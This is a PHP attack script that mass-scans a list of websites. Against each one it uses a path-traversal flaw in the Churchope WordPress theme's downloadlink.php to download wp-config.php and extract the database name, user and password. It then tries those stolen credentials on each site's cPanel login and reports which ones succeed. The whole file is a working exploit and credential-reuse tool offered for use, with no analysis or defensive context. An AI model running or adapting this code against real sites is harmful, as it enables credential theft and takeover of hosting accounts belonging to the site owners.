<?php
// Con7ext
// php file.php list.txt
define("PAYLOAD", "/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php");
function gStr($str, $f, $e){
  $c = explode($f, $str);
  $c = explode($e, $c[1]);
  return $c[0];
}
function req($url, $post = null){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  if(!empty($post)){
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  }
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
  $c = curl_exec($ch);
  $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  return [
    "head" => $http,
    "body" => $c
  ];
}
$list = @$argv[1];
$e = @explode("\n", @file_get_contents($list));
$bl = "\033[0;34m";
$gr = "\033[0;32m";
$re = "\033[0;31m";
foreach($e as $site){
  $mek = req($site.PAYLOAD);
  if(preg_match("/DB_NAME/", $mek["body"])){
    $usr = gStr($mek["body"], "'DB_USER', '", "'");
    $db = gStr($mek["body"], "'DB_NAME', '", "'");
    $pas = gStr($mek["body"], "'DB_PASSWORD', '", "'");
    echo "${gr}[+] $site -> Vuln\n";
    echo "DB_USER = ${usr}\n";
    echo "DB_NAME = ${db}\n";
    echo "DB_PASS = ${pas}\n";
    echo "${bl}[!] Check If Site Using Cpanel ...\n";
    $m = explode("/", $site);
    $mos = req($m[0]."//".$m[2]."/cpanel");
    if(preg_match("/cPanel|cpanel/", $mos["body"])){
      echo "${gr}[+] Site Using Cpanel ... ${bl}[!] Trying To Login To Cpanel\n";
      $usrr = explode("_", $usr);
      $cok = req($m[0]."//".$m[2]."/cpanel", "user=${usrr[0]}&pass=${pas}&login=");
      if(preg_match("/The login is invalid./", $cok["body"])){
        echo "${re}[-] Login Failed ...\n\n";
      }
      elseif(preg_match("/Login Succes|login succes|Login succes|success:success_function/", $cok["body"])){
        echo "${gr}[+] Login Success ... USER ${usrr[0]} PASS ${pas}\n\n";
      }
      else{
        echo "${re}[-] Login Failed ...\n\n";
      }
    }
    else{
      echo "${re}[-] Site Not Using Cpanel ...\n\n";
    }
  }
  else{
    echo "${re}[-] $site -> Failed Or Can't Get Wp-config STATUS CODE: ".$mek["head"]."\n";
  }
}
echo "\033[1;37m";
